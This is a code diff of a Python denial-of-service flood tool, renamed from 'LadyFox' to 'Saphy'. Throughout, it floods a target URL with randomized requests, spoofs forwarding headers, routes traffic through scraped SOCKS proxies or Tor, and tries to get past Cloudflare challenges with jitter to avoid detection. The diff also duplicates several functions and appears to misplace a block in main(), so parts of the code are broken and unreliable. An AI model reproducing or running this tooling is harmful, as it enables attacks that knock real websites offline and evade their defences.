@@ -1,14 +1,17 @@
-# LadyFox v1.0 - Firepower Edition
-# Developed By: LYNSS
+# saphy V2.0
+# Developed by: LYNSS
 import threading
 import asyncio
 import aiohttp
+import aiohttp_socks
 import random
 import time
 import os
 import socket
 import cloudscraper
 import requests
+import json
+import re
 from rich.console import Console
 from rich.live import Live
 from rich.table import Table
@@ -17,8 +20,80 @@ from colorama import Fore, Style, init
 from aiohttp_socks import ProxyConnector
 from cloudscraper import create_scraper
 
+def fake_ip():
+    return '.'.join(str(random.randint(1, 254)) for _ in range(4))
+
+def fake_headers(base_url, user_agents):
+    return {
+        "User-Agent": random.choice(user_agents),
+        "Accept": "*/*",
+        "Accept-Language": "en-US,en;q=0.5",
+        "Referer": base_url,
+        "X-Bot-ID": str(random.randint(1000, 9999)),
+        "X-Forwarded-For": fake_ip(),
+        "Via": "1.1 proxy-bot"
+    }
+
+def categorize_proxies(proxy_list):
+    http, socks4, socks5 = [], [], []
+    for proxy in proxy_list:
+        if re.match(r"^\d+\.\d+\.\d+\.\d+:\d+$", proxy):
+            if "socks4" in proxy.lower():
+                socks4.append(proxy.replace("socks4://", ""))
+            elif "socks5" in proxy.lower():
+                socks5.append(proxy.replace("socks5://", ""))
+            else:
+                http.append(proxy.replace("http://", ""))
+    return http, socks4, socks5
+
+def geo_ip(ip):
+    try:
+        res = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
+        data = res.json()
+        return f"{data.get('country', 'N/A')} ({data.get('city', 'N/A')})"
+    except:
+        return "Unknown"
+
+def get_connector(proxy, proxy_type):
+    if proxy_type == "http":
+        return aiohttp.TCPConnector(ssl=False)
+    elif proxy_type == "socks4":
+        return ProxyConnector.from_url(f"socks4://{proxy}")
+    elif proxy_type == "socks5":
+        return ProxyConnector.from_url(f"socks5://{proxy}")
+    else:
+        return None
+    
+
 # Initialize colorama
 init(autoreset=True)
+
+def fake_ip():
+    return '.'.join(str(random.randint(1, 254)) for _ in range(4))
+
+def fake_headers(base_url, user_agents):
+    return {
+        "User-Agent": random.choice(user_agents),
+        "Accept": "*/*",
+        "Accept-Language": "en-US,en;q=0.5",
+        "Referer": base_url,
+        "X-Bot-ID": str(random.randint(1000, 9999)),
+        "X-Forwarded-For": fake_ip(),
+        "Via": "1.1 proxy-bot"
+    }
+
+def categorize_proxies(proxy_list):
+    http, socks4, socks5 = [], [], []
+    for proxy in proxy_list:
+        if re.match(r"^\d+\.\d+\.\d+\.\d+:\d+$", proxy):
+            if "socks4" in proxy.lower():
+                socks4.append(proxy.replace("socks4://", ""))
+            elif "socks5" in proxy.lower():
+                socks5.append(proxy.replace("socks5://", ""))
+            else:
+                http.append(proxy.replace("http://", ""))
+    return http, socks4, socks5
+
 
 # Load user agents
 def load_user_agents():
@@ -113,6 +188,7 @@ def scrape_proxies():
     print(f"{Fore.GREEN}[+] Scraped {len(proxies)} proxies!\n")
     return list(proxies)
 
+
 # Analyze target info
 def analyze_target(url):
     print(f"{Fore.CYAN}[i] Analyzing target...")
@@ -184,7 +260,7 @@ def generate_headers(url, user_agents, mode="basic"):
         headers["Cookie"] = f"session={random.randint(100000, 999999)}"
     elif mode == "referer":
         headers["Referer"] = random.choice([
-            "https://google.com", "https://bing.com", "https://pornhub.com",
+            "https://google.com", "https://bing.com",
             "https://facebook.com", "https://tiktok.com"
         ])
     elif mode == "cache":
@@ -192,30 +268,29 @@ def generate_headers(url, user_agents, mode="basic"):
     return headers
 
 # Async attack
-async def generic_attack(url, duration, user_agents, proxies, method="GET", uri_random=False, data=None, header_mode="basic", random_method=False):
+async def generic_attack(url, duration, user_agents, proxy, proxy_type, method="GET", uri_random=False, data=None, header_mode="basic", random_method=False):
+    end_time = time.time() + duration
     timeout = aiohttp.ClientTimeout(total=10)
-    connector = aiohttp.TCPConnector(ssl=False)
-    async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
-        end_time = time.time() + duration
+
+    connector = get_connector(proxy, proxy_type)
+    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
         while time.time() < end_time:
             try:
-                path = f"?{random.randint(1, 999999)}" if uri_random else ""
-                headers = generate_headers(url, user_agents, header_mode)
-                proxy = f"http://{random.choice(proxies)}" if proxies else None
+                path = f"?id={random.randint(1, 999999)}" if uri_random else ""
+                headers = fake_headers(url, user_agents)
                 use_method = method if not random_method else random.choice(["GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS"])
-                
+
                 async with session.request(
                     method=use_method,
                     url=url + path,
-                    headers=headers,
-                    proxy=proxy
+                    headers=headers
                 ) as response:
                     await response.read()
-                
+
                 with lock:
                     counters["total"] += 1
                     counters["success"] += 1
-            except Exception:
+            except:
                 with lock:
                     counters["total"] += 1
                     counters["error"] += 1
@@ -234,7 +309,7 @@ def cloudflare_bypass(url, duration, user_agents):
             "Referer": random.choice([
                 "https://google.com", "https://bing.com", "https://yahoo.com",
                 "https://facebook.com", "https://twitter.com", "https://instagram.com",
-                "https://pornhub.com", "https://tiktok.com", "https://reddit.com",
+                "https://tiktok.com", "https://reddit.com",
                 "https://github.com", "https://stackoverflow.com",
 
             ]),
@@ -245,7 +320,7 @@ def cloudflare_bypass(url, duration, user_agents):
         try:
             response = scraper.get(url, headers=headers, timeout=10)
 
-            # Cloudflare challenge detection (basic)
+            # Cloudflare challenge detection
             if "cf-chl-bypass" in response.text or "Attention Required" in response.text:
                 raise Exception("Cloudflare challenge page detected")
 
@@ -257,7 +332,6 @@ def cloudflare_bypass(url, duration, user_agents):
                 counters["total"] += 1
                 counters["error"] += 1
         
-        # Jitter to reduce detection
         time.sleep(random.uniform(0.8, 2.5))
 
 # Stats Dashboard
@@ -275,7 +349,7 @@ def stats_dashboard(url, duration):
         prev_total = total
 
         os.system('cls' if os.name == 'nt' else 'clear')
-        print(f"{Fore.LIGHTYELLOW_EX}=== LadyFox v1.0 - Attack Dashboard ==={Style.RESET_ALL}")
+        print(f"{Fore.LIGHTYELLOW_EX}=== Saphy v1.0 - Attack Dashboard ==={Style.RESET_ALL}")
         print(f"{Fore.LIGHTCYAN_EX}Target        : {url}")
         print(f"{Fore.LIGHTCYAN_EX}Time Left     : {int(end_time - time.time())}s")
         print(f"{Fore.LIGHTCYAN_EX}Total Requests: {total}")
@@ -385,15 +459,15 @@ async def main():
     os.system('cls' if os.name == 'nt' else 'clear')
     print(f"""
 {Fore.LIGHTYELLOW_EX}
-██╗      █████╗ ██████╗ ██╗   ██╗███████╗ ██████╗ ██╗  ██╗
-██║     ██╔══██╗██╔══██╗╚██╗ ██╔╝██╔════╝██╔═══██╗╚██╗██╔╝
-██║     ███████║██║  ██║ ╚████╔╝ █████╗  ██║   ██║ ╚███╔╝ 
-██║     ██╔══██║██║  ██║  ╚██╔╝  ██╔══╝  ██║   ██║ ██╔██╗ 
-███████╗██║  ██║██████╔╝   ██║   ██║     ╚██████╔╝██╔╝ ██╗
-╚══════╝╚═╝  ╚═╝╚═════╝    ╚═╝   ╚═╝      ╚═════╝ ╚═╝  ╚═╝
+███████╗ █████╗ ██████╗ ██╗  ██╗██╗   ██╗    
+██╔════╝██╔══██╗██╔══██╗██║  ██║╚██╗ ██╔╝    
+███████╗███████║██████╔╝███████║ ╚████╔╝     
+╚════██║██╔══██║██╔═══╝ ██╔══██║  ╚██╔╝      
+███████║██║  ██║██║     ██║  ██║   ██║       
+╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝   ╚═╝       
 {Style.RESET_ALL}
-         {Fore.LIGHTYELLOW_EX}LadyFox{Style.RESET_ALL} v1.0 - Firepower Edition
-{Fore.LIGHTCYAN_EX}  Developed By: LYNSS
+         {Fore.LIGHTYELLOW_EX}Saphy{Style.RESET_ALL} Saphy v1.0 - Firepower Edition
+{Fore.LIGHTCYAN_EX}  Developed By: Lynss
 {Style.RESET_ALL}
     """)
     print(f"{Fore.LIGHTGREEN_EX}Choose Layer: ")
@@ -431,7 +505,25 @@ async def main():
         selected_mode = list(attack_modes.keys())[mode_choice]
 
         user_agents = load_user_agents()
-        proxies = scrape_proxies()
+        
+        http_proxies, socks4_proxies, socks5_proxies = categorize_proxies(scrape_proxies())
+        selected_type = "socks5"  
+
+        if selected_type == "http":
+            proxy_list = http_proxies
+        elif selected_type == "socks4":
+            proxy_list = socks4_proxies
+        elif selected_type == "socks5":
+            proxy_list = socks5_proxies
+        elif selected_type == "tor":
+            proxy_list = ["127.0.0.1:9050"] * 50  
+            selected_type = "socks5"
+
+        print(f"{Fore.LIGHTCYAN_EX}Proxies being used:")
+        for proxy in proxy_list[:100]:  
+            ip = proxy.split(":")[0]
+            location = geo_ip(ip)
+            print(f"{proxy} -> {location}")
 
         threading.Thread(target=stats_dashboard, args=(url, duration), daemon=True).start()
 
@@ -441,7 +533,22 @@ async def main():
             for t in threads_list: t.join()
         else:
             config = attack_modes[selected_mode]
-            await asyncio.gather(*[generic_attack(url, duration, user_agents, proxies, **config) for _ in range(threads)])
+            tasks = []
+        for proxy in proxy_list:
+            tasks.append(generic_attack(
+                url=url,
+                duration=duration,
+                user_agents=user_agents,
+                proxy=proxy,
+                proxy_type=selected_type,
+                method=config.get("method", "GET"),
+                uri_random=config.get("uri_random", False),
+                data=config.get("data", None),
+                header_mode=config.get("header_mode", "basic"),
+                random_method=config.get("random_method", False)
+            ))
+
+        await asyncio.gather(*tasks)
 
         print(f"\n{Fore.GREEN}[+] Attack finished! Total: {counters['total']}, Success: {counters['success']}, Errors: {counters['error']}")
 
